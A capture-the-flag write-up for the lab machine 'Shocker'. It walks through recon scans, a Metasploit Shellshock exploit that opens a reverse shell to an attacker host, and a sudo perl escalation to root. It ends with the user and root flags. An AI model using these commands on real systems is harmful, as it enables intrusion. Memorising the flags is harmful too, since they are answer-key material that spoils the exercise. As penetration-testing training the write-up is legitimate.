# Shocker - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.56

feroxbuster -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi --extract-links --scan-limit 2

nikto -h 10.10.10.56

feroxbuster -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 401,404,405,500
#scan for scripts in /cgi-bin
#we get user.sh

#checking for shellshock
nmap -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
#vulnerable

#for shellshock exploit
msfconsole -q

use exploit/multi/http/apache_mod_cgi_bash_env_exec

options

set LHOST 10.10.14.2

set RHOSTS 10.10.10.56

set TARGETURI /cgi-bin/user.sh

set payload linux/x86/shell/reverse_tcp

run
#we get shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

sudo -l
#we can run perl as sudo without password

#exploit from GTFObins
sudo /usr/bin/perl -e 'exec "/bin/sh";'
#gives root shell
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.18 (Ubuntu)
  * 2222 - ssh - OpenSSH 7.2p2

* Enumerating the webpage on port 80 for hidden directories while exploring the webpage gives us an image file - we can check for clues using stego tools, but we do not get anything.

* Using ```feroxbuster```, we get a /cgi-bin directory with status code 403.

* This directory indicates the presence of scripts - we can search for exploits related to /cgi-bin.

* Searching for 'cgi-bin' gives us results for exploit 'Shellshock'; we can meanwhile continue enumerating in /cgi-bin directory for any scripts.

* For scripts, we have to take into consideration extensions such as .cgi, .pl, .sh, .php, etc.

* Scanning using ```feroxbuster``` gives us user.sh in /cgi-bin

* We can confirm if the machine is vulnerable to 'Shellshock' exploit using ```nmap``` - it shows vulnerable.

* Now, we can run the Shellshock exploit using ```Metasploit``` and get shell.

* We get shell as 'shelly' - we can check for privesc now.

* Using ```sudo -l```, we can see that 'perl' can be run as root without password.

* With the help of GTFObins, we can get and execute the exploit to get root shell.

```markdown
1. User flag - ce85fbe9f3807245238b4c348249c228

2. Root flag - 59fc655858117c7cb1c9137bd759c2b3
```
